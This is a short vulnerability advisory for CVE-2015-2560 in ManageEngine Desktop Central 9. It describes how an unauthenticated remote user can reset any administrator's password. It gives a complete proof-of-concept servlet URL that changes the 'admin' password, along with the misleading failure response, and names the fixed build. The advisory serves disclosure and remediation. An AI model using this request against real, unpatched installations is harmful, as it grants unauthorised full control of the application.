Subject: Manage Engine Desktop Central 9 - CVE-2015-2560 - Unauthorised
 administrative password reset

A vulnerability exists in the Manage Engine Desktop Central 9 application that affects version (build 90130). This may affect earlier releases as well.

The vulnerability allows a remote unauthenticated user to change the password of any Manage Engine Desktop Central user with the �Administrator� role (DCAdmin).
The following proof of concept URL changes the �admin� user password to �admin3�. 

http://<IP>:8020/servlets/DCOperationsServlet?operation=addOrModifyUser&roleId=DCAdmin&userName=admin&password=admin3

The XML response suggests the user modification failed, however a user can perform a successful login with the supplied credentials:

<operation>
<operationstatus>Failure</operationstatus>
<message>Problem while modifying user admin in DC.</message>
</operation>

Complete control of the application can now be obtained by an unauthorised user.

Vulnerability remediation:
This vulnerability was fixed in Desktop Central build 90135. Refer to the vendor advisory for product update information and instructions.
